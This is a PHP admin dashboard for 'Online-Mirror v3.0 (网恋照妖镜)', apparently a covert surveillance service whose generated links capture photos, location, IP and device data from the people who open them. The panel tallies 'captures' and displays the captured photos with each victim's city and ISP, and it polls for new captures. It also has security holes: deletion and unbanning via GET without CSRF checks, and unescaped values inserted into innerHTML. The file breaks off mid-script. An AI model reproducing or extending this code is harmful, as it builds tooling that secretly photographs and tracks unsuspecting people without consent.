<?php
/**
 * Online-Mirror v3.0 - 管理后台
 * 功能：总览(趋势图+AJAX照片)、链接管理(含标签)、登录记录、封禁IP、数据导出
 */
require_once __DIR__ . '/config.php';
requireLogin();

$db = getDB();
$user = getCurrentUser();
$csrf = csrfToken();

// ========== 标签页切换 ==========
$tab = $_GET['tab'] ?? 'overview';

// ========== 统计数据 ==========
$total_links = $db->query("SELECT COUNT(*) FROM mir_links")->fetchColumn();
$total_photos = $db->query("SELECT COUNT(*) FROM mir_photos")->fetchColumn();
$total_views = $db->query("SELECT SUM(views) FROM mir_links")->fetchColumn() ?: 0;
$total_captures = $db->query("SELECT SUM(captures) FROM mir_links")->fetchColumn() ?: 0;

$today_start = date('Y-m-d 00:00:00');
$today_photos = $db->prepare("SELECT COUNT(*) FROM mir_photos WHERE created_at >= ?");
$today_photos->execute([$today_start]);
$today_photos = $today_photos->fetchColumn();

$today_visits = $db->prepare("SELECT COUNT(*) FROM mir_logs WHERE action='visit' AND created_at >= ?");
$today_visits->execute([$today_start]);
$today_visits = $today_visits->fetchColumn();

// ========== 获取最近链接（含标签） ==========
$stmt = $db->query("SELECT * FROM mir_links ORDER BY created_at DESC LIMIT 30");
$recent_links = $stmt->fetchAll();

// ========== 更新标签 ==========
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'update_tags') {
    requireCsrf();
    $link_id = trim($_POST['link_id'] ?? '');
    $tags = trim($_POST['tags'] ?? '');
    $tags = mb_substr(strip_tags($tags), 0, 200);
    $stmt = $db->prepare("UPDATE mir_links SET tags = ? WHERE link_id = ?");
    $stmt->execute([$tags, $link_id]);
    header("Location: dashboard.php?tab=links");
    exit;
}

// ========== 删除链接 ==========
if (isset($_GET['delete_link']) && $user['role'] === 'admin') {
    $link_id = trim($_GET['delete_link']);
    $stmt = $db->prepare("SELECT file_path FROM mir_photos WHERE link_id = ?");
    $stmt->execute([$link_id]);
    foreach ($stmt->fetchAll() as $p) {
        $fp = IMG_DIR . $p['file_path'];
        if (file_exists($fp)) unlink($fp);
    }
    $stmt = $db->prepare("DELETE FROM mir_links WHERE link_id = ?");
    $stmt->execute([$link_id]);
    addLog($link_id, 'delete_link');
    header("Location: dashboard.php?tab=links");
    exit;
}

// ========== 解封IP ==========
if (isset($_GET['unban_ip']) && $user['role'] === 'admin') {
    $ip = trim($_GET['unban_ip']);
    $stmt = $db->prepare("DELETE FROM mir_banned_ips WHERE ip_address = ?");
    $stmt->execute([$ip]);
    header("Location: dashboard.php?tab=banned");
    exit;
}

// ========== 手动封禁IP ==========
$ban_error = '';
$ban_success = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action']) && $_POST['action'] === 'ban_ip' && $user['role'] === 'admin') {
    requireCsrf();
    $ban_ip = trim($_POST['ban_ip'] ?? '');
    $ban_reason = trim($_POST['ban_reason'] ?? '违规行为，系统已封禁');
    if (empty($ban_reason)) $ban_reason = '违规行为，系统已封禁';
    $ban_reason = mb_substr(strip_tags($ban_reason), 0, 200);
    
    if (empty($ban_ip)) {
        $ban_error = '请输入IP地址';
    } elseif (!filter_var($ban_ip, FILTER_VALIDATE_IP)) {
        $ban_error = 'IP地址格式不正确';
    } else {
        // 检查是否已封禁
        $stmt = $db->prepare("SELECT COUNT(*) FROM mir_banned_ips WHERE ip_address = ?");
        $stmt->execute([$ban_ip]);
        if ($stmt->fetchColumn() > 0) {
            $ban_error = "IP {$ban_ip} 已被封禁";
        } else {
            $stmt = $db->prepare("INSERT INTO mir_banned_ips (ip_address, reason, banned_by) VALUES (?, ?, 'admin')");
            $stmt->execute([$ban_ip, $ban_reason]);
            $ban_success = "✅ IP {$ban_ip} 已成功封禁";
            // 刷新列表
            $stmt = $db->query("SELECT * FROM mir_banned_ips ORDER BY created_at DESC");
            $banned_ips = $stmt->fetchAll();
        }
    }
}

// ========== 登录日志分页 ==========
$log_page = max(0, intval($_GET['log_page'] ?? 0));
$log_per_page = 30;
$log_total = $db->query("SELECT COUNT(*) FROM mir_logs")->fetchColumn();
$log_total_pages = max(1, ceil($log_total / $log_per_page));
$log_page = min($log_page, $log_total_pages - 1);
$log_offset = $log_page * $log_per_page;

$stmt = $db->prepare("SELECT * FROM mir_logs ORDER BY created_at DESC LIMIT ? OFFSET ?");
$stmt->execute([$log_per_page, $log_offset]);
$logs = $stmt->fetchAll();

// ========== 封禁IP列表 ==========
$stmt = $db->query("SELECT * FROM mir_banned_ips ORDER BY created_at DESC");
$banned_ips = $stmt->fetchAll();

// ========== 趋势图数据（近7天） ==========
$chart_data = [];
for ($i = 6; $i >= 0; $i--) {
    $d = date('Y-m-d', strtotime("-{$i} days"));
    $visits = $db->prepare("SELECT COUNT(*) FROM mir_logs WHERE action='visit' AND DATE(created_at) = ?");
    $visits->execute([$d]);
    $captures = $db->prepare("SELECT COUNT(*) FROM mir_logs WHERE action='capture' AND DATE(created_at) = ?");
    $captures->execute([$d]);
    $chart_data[] = [
        'date' => date('m/d', strtotime($d)),
        'visits' => (int)$visits->fetchColumn(),
        'captures' => (int)$captures->fetchColumn()
    ];
}
$chart_json = json_encode($chart_data);

// ========== 照片总数（用于AJAX）==========
$photo_total = $db->query("SELECT COUNT(*) FROM mir_photos")->fetchColumn();
?>
<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<link rel="icon" type="image/x-icon" href="favicon.ico">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>控制台 v3.0 · 网恋照妖镜</title>
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
<script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.1/dist/chart.umd.min.js"></script>
<style>
* { margin: 0; padding: 0; box-sizing: border-box; }
body {
    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
    background: #0f0c29;
    color: #e0e0e0;
    min-height: 100vh;
}
.topbar {
    background: rgba(255,255,255,0.04);
    backdrop-filter: blur(20px);
    border-bottom: 1px solid rgba(255,255,255,0.08);
    padding: 16px 24px;
    display: flex;
    align-items: center;
    justify-content: space-between;
    flex-wrap: wrap;
    gap: 12px;
    position: sticky;
    top: 0;
    z-index: 10;
}
.topbar .brand {
    font-size: 20px; font-weight: 700;
    background: linear-gradient(90deg, #667eea, #764ba2);
    -webkit-background-clip: text; -webkit-text-fill-color: transparent;
    display: flex; align-items: center; gap: 8px;
}
.topbar .nav { display: flex; gap: 8px; align-items: center; flex-wrap: wrap; }
.topbar .nav a {
    padding: 8px 16px; border-radius: 8px; text-decoration: none;
    font-size: 13px; transition: all 0.3s; color: #a0a0b8;
}
.topbar .nav a:hover { background: rgba(255,255,255,0.06); color: #e0e0e0; }
.topbar .nav a.active { background: rgba(102,126,234,0.15); color: #667eea; }
.topbar .nav a.logout { color: #ff6b6b; }

.tab-nav {
    display: flex; gap: 4px; padding: 16px 24px 0;
    max-width: 1200px; margin: 0 auto;
    border-bottom: 1px solid rgba(255,255,255,0.06);
    overflow-x: auto;
}
.tab-nav a {
    padding: 10px 20px; border-radius: 10px 10px 0 0;
    text-decoration: none; font-size: 14px; color: #8080a0;
    transition: all 0.3s; display: flex; align-items: center; gap: 6px;
    white-space: nowrap;
}
.tab-nav a:hover { background: rgba(255,255,255,0.04); color: #e0e0e0; }
.tab-nav a.active {
    background: rgba(102,126,234,0.12); color: #667eea;
    border-bottom: 2px solid #667eea;
}

.container { max-width: 1200px; margin: 0 auto; padding: 24px; }

.stats-grid {
    display: grid;
    grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
    gap: 16px; margin-bottom: 24px;
}
.stat-card {
    background: rgba(255,255,255,0.04);
    border: 1px solid rgba(255,255,255,0.08);
    border-radius: 16px; padding: 20px; text-align: center; transition: all 0.3s;
}
.stat-card:hover { transform: translateY(-2px); border-color: rgba(102,126,234,0.3); }
.stat-card .num {
    font-size: 32px; font-weight: 700;
    background: linear-gradient(135deg, #667eea, #764ba2);
    -webkit-background-clip: text; -webkit-text-fill-color: transparent;
}
.stat-card .label { font-size: 13px; color: #8080a0; margin-top: 6px; }

/* 图表容器 */
.chart-wrap {
    background: rgba(255,255,255,0.03);
    border: 1px solid rgba(255,255,255,0.06);
    border-radius: 16px;
    padding: 20px;
    margin-bottom: 28px;
}
.chart-wrap .chart-container {
    position: relative;
    height: 220px;
}
@media (max-width: 640px) {
    .chart-wrap .chart-container { height: 160px; }
}

.section-title {
    font-size: 18px; margin-bottom: 16px;
    display: flex; align-items: center; justify-content: space-between; gap: 8px; flex-wrap: wrap;
}
.section-title .refresh-btn {
    padding: 6px 14px;
    border: 1px solid rgba(102,126,234,0.3);
    border-radius: 8px; background: rgba(102,126,234,0.1);
    color: #667eea; font-size: 12px; cursor: pointer; transition: all 0.3s; text-decoration: none;
}
.section-title .refresh-btn:hover { background: rgba(102,126,234,0.2); }
.section-title .export-btn {
    padding: 6px 14px;
    border: 1px solid rgba(76,175,80,0.3);
    border-radius: 8px; background: rgba(76,175,80,0.1);
    color: #4caf50; font-size: 12px; cursor: pointer; transition: all 0.3s; text-decoration: none;
}
.section-title .export-btn:hover { background: rgba(76,175,80,0.2); }

.table-wrap {
    overflow-x: auto;
    background: rgba(255,255,255,0.03);
    border: 1px solid rgba(255,255,255,0.06);
    border-radius: 16px; margin-bottom: 28px;
}
table { width: 100%; border-collapse: collapse; font-size: 13px; }
table th {
    text-align: left; padding: 14px 16px;
    background: rgba(255,255,255,0.04); color: #8080a0;
    font-weight: 500; font-size: 12px; text-transform: uppercase;
    letter-spacing: 0.5px; border-bottom: 1px solid rgba(255,255,255,0.06);
}
table td {
    padding: 12px 16px; border-bottom: 1px solid rgba(255,255,255,0.04);
    color: #c0c0d0; max-width: 250px;
    overflow: hidden; text-overflow: ellipsis; white-space: nowrap;
}
table tr:hover td { background: rgba(255,255,255,0.03); }
table td .badge {
    display: inline-block; padding: 2px 8px; border-radius: 4px; font-size: 11px;
}
.badge-active { background: rgba(76,175,80,0.15); color: #4caf50; }
.badge-expired { background: rgba(255,152,0,0.15); color: #ff9800; }
.badge-disabled { background: rgba(255,80,80,0.15); color: #ff6b6b; }
.badge-banned { background: rgba(255,80,80,0.15); color: #ff6b6b; }
table td a { color: #667eea; text-decoration: none; }
table td a:hover { text-decoration: underline; }
table td .action-link { margin: 0 4px; }
table td .tags-cell {
    display: flex; flex-wrap: wrap; gap: 4px;
}
table td .tag-sm {
    background: rgba(102,126,234,0.12);
    padding: 1px 6px; border-radius: 3px;
    font-size: 10px; color: #667eea;
}
table td .tag-edit {
    padding: 2px 6px; border-radius: 3px;
    font-size: 10px; color: #8080a0; cursor: pointer;
}
table td .tag-edit:hover { color: #667eea; }
table td .geocell {
    font-size: 11px; color: #667eea;
}

.photo-mini-grid {
    display: grid;
    grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
    gap: 12px; margin-bottom: 28px;
}
.photo-mini {
    background: rgba(255,255,255,0.04);
    border: 1px solid rgba(255,255,255,0.08);
    border-radius: 12px; overflow: hidden; transition: all 0.3s;
}
.photo-mini:hover { transform: translateY(-2px); border-color: rgba(102,126,234,0.3); }
.photo-mini img {
    width: 100%; aspect-ratio: 3/4;
    object-fit: cover; display: block; background: #111;
}
.photo-mini .info {
    padding: 8px 10px; font-size: 11px; color: #8080a0;
}

.load-more-wrap { text-align: center; margin-bottom: 28px; }
.load-more-btn {
    padding: 10px 24px;
    border: 1px solid rgba(102,126,234,0.3);
    border-radius: 10px; background: rgba(102,126,234,0.08);
    color: #667eea; font-size: 14px; cursor: pointer; transition: all 0.3s;
}
.load-more-btn:hover { background: rgba(102,126,234,0.18); }
.load-more-btn:disabled { opacity: 0.4; cursor: not-allowed; }

.pagination {
    display: flex; justify-content: center; gap: 8px;
    margin-top: 16px; padding-bottom: 24px;
}
.pagination a {
    padding: 8px 16px; border-radius: 8px;
    background: rgba(255,255,255,0.06);
    color: #a0a0b8; text-decoration: none; font-size: 14px; transition: all 0.3s;
}
.pagination a:hover { background: rgba(255,255,255,0.12); }
.pagination a.active {
    background: linear-gradient(135deg, #667eea, #764ba2); color: white;
}

.log-ua { font-size: 11px; color: #606080; max-width: 300px; overflow: hidden; text-overflow: ellipsis; white-space: nowrap; }
.log-success { color: #4caf50; }
.log-fail { color: #ff6b6b; }

/* 标签编辑弹窗 */
.edit-overlay {
    display: none;
    position: fixed; top: 0; left: 0; right: 0; bottom: 0;
    background: rgba(0,0,0,0.6);
    z-index: 999;
    align-items: center; justify-content: center;
}
.edit-overlay.show { display: flex; }
.edit-box {
    background: #1a1a2e;
    border: 1px solid rgba(255,255,255,0.12);
    border-radius: 16px; padding: 24px;
    max-width: 400px; width: 90%;
}
.edit-box h3 { margin-bottom: 12px; font-size: 16px; }
.edit-box input {
    width: 100%; padding: 10px 14px;
    border: 1px solid rgba(255,255,255,0.12);
    border-radius: 10px; background: rgba(255,255,255,0.06);
    color: #e0e0e0; font-size: 14px; outline: none; margin-bottom: 12px;
}
.edit-box .btn-row { display: flex; gap: 8px; justify-content: flex-end; }
.edit-box .btn-row button {
    padding: 8px 16px; border: none; border-radius: 8px;
    font-size: 13px; cursor: pointer; transition: all 0.3s;
}
.edit-box .btn-save { background: #667eea; color: white; }
.edit-box .btn-save:hover { opacity: 0.85; }
.edit-box .btn-cancel { background: rgba(255,255,255,0.08); color: #a0a0b8; }
.edit-box .btn-cancel:hover { background: rgba(255,255,255,0.12); }

@media (max-width: 640px) {
    .container { padding: 16px; }
    .stats-grid { grid-template-columns: 1fr 1fr; }
    .photo-mini-grid { grid-template-columns: repeat(auto-fill, minmax(120px, 1fr)); }
    .tab-nav { padding: 12px 16px 0; }
}
</style>
</head>
<body>
<div class="topbar">
    <div class="brand"><i class="fas fa-camera"></i> 网恋照妖镜 v3.0</div>
    <div class="nav">
        <a href="index.php"><i class="fas fa-home"></i> 首页</a>
        <a href="dashboard.php" class="active"><i class="fas fa-tachometer-alt"></i> 控制台</a>
        <a href="export.php" target="_blank" style="color:#4caf50;"><i class="fas fa-download"></i> 导出</a>
        <a href="settings.php" style="color:#667eea;"><i class="fas fa-cog"></i> 设置</a>
        <a href="settings.php" id="notifyBell" style="position:relative;cursor:pointer;" title="点击设置通知 | 长按打开详细设置">
            <i class="fas fa-bell"></i>
            <?php if (getSetting('email_enabled') === '1'): ?>
            <span style="position:absolute;bottom:-2px;right:-4px;font-size:8px;color:#4caf50;"><i class="fas fa-circle"></i></span>
            <?php endif; ?>
            <span id="notifyBadge" style="display:none;position:absolute;top:2px;right:4px;width:16px;height:16px;background:#ff6b6b;border-radius:50%;font-size:9px;color:#fff;display:none;align-items:center;justify-content:center;">0</span>
        </a>
        <a href="login.php?action=logout" class="logout"><i class="fas fa-sign-out-alt"></i> 退出 (<?php echo htmlspecialchars($user['username']); ?>)</a>
    </div>
    
    <script>
    function checkNotify() {
        fetch('notify.php')
            .then(r => r.json())
            .then(d => {
                var badge = document.getElementById('notifyBadge');
                var total = d.new_photos + d.new_visits;
                if (total > 0) {
                    badge.textContent = total > 99 ? '99+' : total;
                    badge.style.display = 'flex';
                    if (d.newest && d.newest.city) {
                        document.getElementById('notifyBell').title = '📸 新拍照: ' + d.newest.city + ' (' + d.newest.time + ')';
                    }
                } else {
                    badge.style.display = 'none';
                }
            }).catch(function(){});
    }
    checkNotify();
    setInterval(checkNotify, 30000); // 每30秒检查一次
    </script>
</div>

<div class="tab-nav">
    <a href="?tab=overview" class="<?php echo $tab === 'overview' ? 'active' : ''; ?>"><i class="fas fa-chart-bar"></i> 总览</a>
    <a href="?tab=links" class="<?php echo $tab === 'links' ? 'active' : ''; ?>"><i class="fas fa-link"></i> 链接管理</a>
    <a href="?tab=logs" class="<?php echo $tab === 'logs' ? 'active' : ''; ?>"><i class="fas fa-history"></i> 登录记录</a>
    <a href="?tab=banned" class="<?php echo $tab === 'banned' ? 'active' : ''; ?>"><i class="fas fa-ban"></i> 封禁IP (<?php echo count($banned_ips); ?>)</a>
</div>

<div class="container">

<?php if ($tab === 'overview'): ?>
<!-- ==================== 总览 ==================== -->
<div class="stats-grid">
    <div class="stat-card"><div class="num"><?php echo $total_links; ?></div><div class="label">🔗 链接数</div></div>
    <div class="stat-card"><div class="num"><?php echo $total_photos; ?></div><div class="label">📸 照片总数</div></div>
    <div class="stat-card"><div class="num"><?php echo $total_views; ?></div><div class="label">👁️ 总访问</div></div>
    <div class="stat-card"><div class="num"><?php echo $today_visits; ?></div><div class="label">📊 今日访问</div></div>
    <div class="stat-card"><div class="num"><?php echo $today_photos; ?></div><div class="label">📷 今日拍照</div></div>
    <div class="stat-card"><div class="num"><?php echo $total_captures; ?></div><div class="label">🎯 总捕获</div></div>
</div>

<!-- 趋势图 -->
<div class="chart-wrap">
    <h3 class="section-title" style="margin-bottom:12px;">
        <span><i class="fas fa-chart-line"></i> 访问趋势（近7天）</span>
    </h3>
    <div class="chart-container">
        <canvas id="trendChart"></canvas>
    </div>
</div>

<script>
var chartData = <?php echo $chart_json; ?>;
new Chart(document.getElementById('trendChart'), {
    type: 'line',
    data: {
        labels: chartData.map(d => d.date),
        datasets: [{
            label: '访问量',
            data: chartData.map(d => d.visits),
            borderColor: '#667eea',
            backgroundColor: 'rgba(102,126,234,0.1)',
            fill: true,
            tension: 0.4
        }, {
            label: '拍照量',
            data: chartData.map(d => d.captures),
            borderColor: '#ff9800',
            backgroundColor: 'rgba(255,152,0,0.1)',
            fill: true,
            tension: 0.4
        }]
    },
    options: {
        responsive: true,
        maintainAspectRatio: false,
        animation: { duration: 300 },
        plugins: {
            legend: {
                labels: { color: '#8080a0', boxWidth: 12, padding: 12, font: { size: 12 } }
            }
        },
        scales: {
            x: { 
                ticks: { color: '#606080', maxTicksLimit: 7, font: { size: 11 } }, 
                grid: { color: 'rgba(255,255,255,0.05)' } 
            },
            y: { 
                beginAtZero: true, 
                ticks: { color: '#606080', stepSize: 1, font: { size: 11 } }, 
                grid: { color: 'rgba(255,255,255,0.05)' } 
            }
        }
    }
});
</script>

<h3 class="section-title">
    <span><i class="fas fa-clock"></i> 最近捕获照片</span>
    <span>
        <a href="export.php" target="_blank" class="export-btn"><i class="fas fa-download"></i> 导出数据</a>
        <a href="javascript:void(0)" class="refresh-btn" onclick="location.reload()"><i class="fas fa-sync-alt"></i> 刷新</a>
    </span>
</h3>
<div class="photo-mini-grid" id="photoGrid">
    <div style="grid-column:1/-1;text-align:center;padding:40px;color:#8080a0;">
        <i class="fas fa-spinner fa-spin"></i> 加载中...
    </div>
</div>
<div class="load-more-wrap" id="loadMoreWrap" style="display:none;">
    <button class="load-more-btn" id="loadMoreBtn" onclick="loadMorePhotos()"><i class="fas fa-chevron-down"></i> 加载更多</button>
</div>

<script>
let photoPage = 0;
let hasMorePhotos = true;
function loadMorePhotos() {
    if (!hasMorePhotos) return;
    document.getElementById('loadMoreBtn').disabled = true;
    document.getElementById('loadMoreBtn').innerHTML = '<i class="fas fa-spinner fa-spin"></i> 加载中...';
    fetch('ajax_photos.php?page=' + photoPage)
        .then(r => r.json())
        .then(data => {
            const grid = document.getElementById('photoGrid');
            if (photoPage === 0) grid.innerHTML = '';
            if (data.photos.length === 0) {
                if (photoPage === 0) grid.innerHTML = '<p style="grid-column:1/-1;text-align:center;padding:40px;color:#8080a0;">暂无照片，等待捕获...</p>';
                hasMorePhotos = false;
                document.getElementById('loadMoreWrap').style.display = 'none';
                return;
            }
            data.photos.forEach(p => {
                const div = document.createElement('div');
                div.className = 'photo-mini';
                div.innerHTML = '<a href="photos.php?id=' + encodeURIComponent(p.link_id) + '">' +
                    '<img src="img/' + p.file_path + '" alt="照片" loading="lazy"></a>' +
                    '<div class="info">' +
                    '<div><i class="far fa-clock"></i> ' + p.created_at + '</div>' +
                    '<div style="font-size:10px;color:#606080;">ID: ' + p.link_id + '</div></div>';
                grid.appendChild(div);
            });
            photoPage++;
            hasMorePhotos = data.has_more;
            if (hasMorePhotos) {
                document.getElementById('loadMoreBtn').disabled = false;
                document.getElementById('loadMoreBtn').innerHTML = '<i class="fas fa-chevron-down"></i> 加载更多';
                document.getElementById('loadMoreWrap').style.display = 'block';
            } else {
                document.getElementById('loadMoreWrap').style.display = 'none';
            }
        }).catch(() => {
            document.getElementById('loadMoreBtn').disabled = false;
            document.getElementById('loadMoreBtn').innerHTML = '<i class="fas fa-sync-alt"></i> 重试';
        });
}
loadMorePhotos();
</script>

<?php elseif ($tab === 'links'): ?>
<!-- ==================== 链接管理 ==================== -->
<h3 class="section-title">
    <span><i class="fas fa-link"></i> 链接列表（含标签管理）</span>
    <a href="dashboard.php?tab=links" class="refresh-btn"><i class="fas fa-sync-alt"></i> 刷新</a>
</h3>
<?php if (empty($recent_links)): ?>
<p style="color:#8080a0;padding:20px;text-align:center;">暂无链接，去首页生成一个吧～</p>
<?php else: ?>
<div class="table-wrap">
    <table>
        <thead>
            <tr>
                <th>ID</th>
                <th>跳转地址</th>
                <th>标签</th>
                <th>归属地</th>
                <th>访问/捕获</th>
                <th>状态</th>
                <th>创建时间</th>
                <th>操作</th>
            </tr>
        </thead>
        <tbody>
            <?php foreach ($recent_links as $link): 
                $geo_visited = false;
                $stmt = $db->prepare("SELECT city, isp FROM mir_photos WHERE link_id = ? AND city IS NOT NULL LIMIT 1");
                $stmt->execute([$link['link_id']]);
                $geo_info = $stmt->fetch();
            ?>
            <tr>
                <td><code><?php echo htmlspecialchars($link['link_id']); ?></code></td>
                <td style="max-width:150px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;">
                    <a href="<?php echo htmlspecialchars($link['redirect_url']); ?>" target="_blank"><?php echo htmlspecialchars(mb_substr($link['redirect_url'], 0, 30)); ?></a>
                </td>
                <td>
                    <div class="tags-cell">
                        <?php if ($link['tags']): ?>
                            <?php foreach (explode(',', $link['tags']) as $t): ?>
                            <span class="tag-sm"><?php echo htmlspecialchars(trim($t)); ?></span>
                            <?php endforeach; ?>
                        <?php endif; ?>
                        <a class="tag-edit" onclick="editTags('<?php echo htmlspecialchars($link['link_id']); ?>', '<?php echo htmlspecialchars($link['tags'] ?? ''); ?>')"><i class="fas fa-edit"></i></a>
                    </div>
                </td>
                <td>
                    <?php if ($geo_info && $geo_info['city']): ?>
                    <div class="geocell"><?php echo htmlspecialchars($geo_info['city']); ?></div>
                    <?php else: ?>
                    <span style="color:#606080;">-</span>
                    <?php endif; ?>
                </td>
                <td><?php echo $link['views']; ?> / <?php echo $link['captures']; ?></td>
                <td>
                    <?php if ($link['status'] === 'active'): ?>
                        <span class="badge badge-active">活跃</span>
                    <?php elseif ($link['status'] === 'expired'): ?>
                        <span class="badge badge-expired">过期</span>
                    <?php else: ?>
                        <span class="badge badge-disabled">禁用</span>
                    <?php endif; ?>
                </td>
                <td><?php echo date('m-d H:i', strtotime($link['created_at'])); ?></td>
                <td>
                    <a href="photos.php?id=<?php echo urlencode($link['link_id']); ?>" class="action-link"><i class="fas fa-images"></i></a>
                    <?php if ($user['role'] === 'admin'): ?>
                    <a href="?tab=links&delete_link=<?php echo urlencode($link['link_id']); ?>" class="action-link" style="color:#ff6b6b;" onclick="return confirm('删除此链接及所有照片？')"><i class="fas fa-trash"></i></a>
                    <?php endif; ?>
                </td>
            </tr>
            <?php endforeach; ?>
        </tbody>
    </table>
</div>
<?php endif; ?>

<!-- 标签编辑弹窗 -->
<div class="edit-overlay" id="tagEditor">
    <div class="edit-box">
        <form method="POST">
            <input type="hidden" name="action" value="update_tags">
            <input type="hidden" name="csrf_token" value="<?php echo $csrf; ?>">
            <h3>编辑标签</h3>
            <p style="font-size:12px;color:#8080a0;margin-bottom:12px;">多个标签用逗号分隔，如：微信,网友,小红书</p>
            <input type="hidden" name="link_id" id="tag_link_id">
            <input type="text" name="tags" id="tag_input" placeholder="标签1,标签2,标签3">
            <div class="btn-row">
                <button type="button" class="btn-cancel" onclick="document.getElementById('tagEditor').classList.remove('show')">取消</button>
                <button type="submit" class="btn-save">保存</button>
            </div>
        </form>
    </div>
</div>
<script>
function editTags(linkId, currentTags) {
    document.getElementById('tag_link_id').value = linkId;
    document.getElementById('tag_input').value = currentTags;
    document.getElementById('tagEditor').classList.add('show');
}
</script>

<?php elseif ($tab === 'logs'): ?>
<!-- ==================== 登录记录 ==================== -->
<h3 class="section-title">
    <span><i class="fas fa-history"></i> 访问/操作日志</span>
    <a href="dashboard.php?tab=logs" class="refresh-btn"><i class="fas fa-sync-alt"></i> 刷新</a>
</h3>
<div class="table-wrap">
    <table>
        <thead>
            <tr><th>时间</th><th>操作</th><th>链接ID</th><th>IP地址</th><th>设备信息</th></tr>
        </thead>
        <tbody>
            <?php foreach ($logs as $log): 
                $log_action = $log['action'];
                $action_label = '<span style="color:#4caf50;">🆕 创建</span>';
                if ($log_action === 'visit') $action_label = '<span style="color:#667eea;">👁️ 访问</span>';
                elseif ($log_action === 'capture') $action_label = '<span style="color:#ff9800;">📸 拍照</span>';
                elseif ($log_action === 'delete_link') $action_label = '<span style="color:#ff6b6b;">🗑️ 删链</span>';
                elseif ($log_action === 'delete_photo') $action_label = '<span style="color:#ff6b6b;">🗑️ 删图</span>';
                elseif ($log_action === 'clear_photos') $action_label = '<span style="color:#ff6b6b;">🧹 清空</span>';
                elseif ($log_action === 'login_success') $action_label = '<span class="log-success">🔑 登录成功</span>';
                elseif ($log_action === 'login_fail') $action_label = '<span class="log-fail">🔒 登录失败</span>';
            ?>
            <tr>
                <td style="white-space:nowrap;"><?php echo date('m-d H:i:s', strtotime($log['created_at'])); ?></td>
                <td><?php echo $action_label; ?></td>
                <td><code><?php echo htmlspecialchars($log['link_id'] ?? '-'); ?></code></td>
                <td><code><?php echo htmlspecialchars($log['ip_address'] ?? '-'); ?></code></td>
                <td><div class="log-ua" title="<?php echo htmlspecialchars($log['user_agent'] ?? ''); ?>"><?php echo htmlspecialchars(mb_substr($log['user_agent'] ?? '-', 0, 60)); ?></div></td>
            </tr>
            <?php endforeach; ?>
        </tbody>
    </table>
</div>
<?php if ($log_total_pages > 1): ?>
<div class="pagination">
    <?php for ($i = 0; $i < $log_total_pages; $i++): ?>
    <a href="?tab=logs&log_page=<?php echo $i; ?>" class="<?php echo $i === $log_page ? 'active' : ''; ?>"><?php echo $i + 1; ?></a>
    <?php endfor; ?>
</div>
<?php endif; ?>

<?php elseif ($tab === 'banned' && $user['role'] === 'admin'): ?>
<!-- ==================== 封禁IP ==================== -->
<h3 class="section-title">
    <span><i class="fas fa-ban"></i> 封禁IP列表</span>
    <a href="dashboard.php?tab=banned" class="refresh-btn"><i class="fas fa-sync-alt"></i> 刷新</a>
</h3>

<!-- 手动封禁表单（点击展开） -->
<div style="margin-bottom:16px;">
    <button onclick="toggleBanForm()" id="banFormToggleBtn" 
        style="width:100%;padding:12px 20px;border:1px dashed rgba(255,80,80,0.25);border-radius:12px;background:rgba(255,80,80,0.04);color:#ff6b6b;font-size:14px;font-weight:600;cursor:pointer;transition:all 0.3s;display:flex;align-items:center;justify-content:center;gap:8px;"
        onmouseover="this.style.background='rgba(255,80,80,0.1)'" onmouseout="this.style.background='rgba(255,80,80,0.04)'">
        <i class="fas fa-gavel"></i> 手动封禁IP
        <i class="fas fa-chevron-down" id="banFormArrow" style="font-size:12px;transition:transform 0.3s;"></i>
    </button>
    <div id="banFormBody" style="display:none;margin-top:10px;background:rgba(255,80,80,0.06);border:1px solid rgba(255,80,80,0.12);border-radius:12px;padding:16px 20px;">
        <?php if ($ban_error): ?>
            <div style="padding:8px 12px;border-radius:8px;background:rgba(255,80,80,0.12);color:#ff6b6b;font-size:13px;margin-bottom:10px;"><?php echo htmlspecialchars($ban_error); ?></div>
        <?php endif; ?>
        <?php if ($ban_success): ?>
            <div style="padding:8px 12px;border-radius:8px;background:rgba(76,175,80,0.12);color:#4caf50;font-size:13px;margin-bottom:10px;"><?php echo htmlspecialchars($ban_success); ?></div>
        <?php endif; ?>
        <form method="POST" style="display:flex;gap:10px;flex-wrap:wrap;align-items:flex-end;">
            <input type="hidden" name="action" value="ban_ip">
            <input type="hidden" name="csrf_token" value="<?php echo $csrf; ?>">
            <div style="flex:1;min-width:160px;">
                <label style="font-size:12px;color:#8080a0;display:block;margin-bottom:4px;">IP地址</label>
                <input type="text" name="ban_ip" placeholder="例如：192.168.1.1" required
                    style="width:100%;padding:10px 14px;border:1px solid rgba(255,80,80,0.2);border-radius:8px;background:rgba(0,0,0,0.2);color:#e0e0e0;font-size:14px;outline:none;">
            </div>
            <div style="flex:1;min-width:160px;">
                <label style="font-size:12px;color:#8080a0;display:block;margin-bottom:4px;">封禁原因（选填）</label>
                <input type="text" name="ban_reason" placeholder="例如：恶意刷链接"
                    style="width:100%;padding:10px 14px;border:1px solid rgba(255,255,255,0.1);border-radius:8px;background:rgba(0,0,0,0.2);color:#e0e0e0;font-size:14px;outline:none;">
            </div>
            <button type="submit" 
                style="padding:10px 20px;border:none;border-radius:8px;background:linear-gradient(135deg,#ff6b6b,#ee5a24);color:white;font-size:14px;font-weight:600;cursor:pointer;transition:all 0.3s;white-space:nowrap;"
                onmouseover="this.style.opacity='0.85'" onmouseout="this.style.opacity='1'">
                <i class="fas fa-ban"></i> 封禁
            </button>
        </form>
    </div>
</div>
<script>
function toggleBanForm() {
    var body = document.getElementById('banFormBody');
    var arrow = document.getElementById('banFormArrow');
    var btn = document.getElementById('banFormToggleBtn');
    if (body.style.display === 'block') {
        body.style.display = 'none';
        arrow.style.transform = 'rotate(0deg)';
        btn.style.borderStyle = 'dashed';
    } else {
        body.style.display = 'block';
        arrow.style.transform = 'rotate(180deg)';
        btn.style.borderStyle = 'solid';
    }
}
<?php if ($ban_error || $ban_success): ?>
document.addEventListener('DOMContentLoaded', function() {
    toggleBanForm();
});
